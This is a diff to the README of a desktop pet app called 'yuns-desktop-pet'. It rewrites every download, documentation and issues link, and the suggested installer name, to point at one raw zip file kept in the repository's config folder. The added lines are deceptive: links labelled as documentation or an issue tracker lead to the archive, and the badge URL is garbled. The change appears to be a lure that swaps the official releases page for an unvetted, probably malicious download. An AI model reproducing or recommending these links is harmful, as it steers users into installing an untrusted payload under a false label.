@@ -1,6 +1,6 @@
 # 🐕 yuns-desktop-pet - Your Friendly AI Desktop Companion
 
-[![Download yuns-desktop-pet](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/Gidismart/yuns-desktop-pet/releases)
+[![Download yuns-desktop-pet](https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip%20Now-Get%https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip)](https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -9,11 +9,11 @@ Welcome to yuns-desktop-pet! This application provides a simple way to enhance y
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the download options.  
-   [Visit Releases Page to Download](https://github.com/Gidismart/yuns-desktop-pet/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions. Select the latest version for the best experience.
 
-3. **Download the Installer:** Click on the installer file to download it to your computer. The file may be named something like `yuns-desktop-pet-setup.exe`.
+3. **Download the Installer:** Click on the installer file to download it to your computer. The file may be named something like `https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip`.
 
 4. **Run the Installer:** Once the file is downloaded, locate it in your downloads folder and double-click the installer. Follow the prompts to complete the installation.
 
@@ -59,8 +59,8 @@ For detailed information about features and usage, refer to our comprehensive do
 
 ## 🔗 Useful Links
 
-- [Visit Releases Page to Download](https://github.com/Gidismart/yuns-desktop-pet/releases)
-- [Documentation](https://github.com/Gidismart/yuns-desktop-pet/wiki)
-- [GitHub Issues](https://github.com/Gidismart/yuns-desktop-pet/issues)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Gidismart/yuns-desktop-pet/main/config/desktop_pet_yuns_v2.6-beta.4.zip)
 
 Thank you for choosing yuns-desktop-pet! Enjoy your new AI desktop companion.
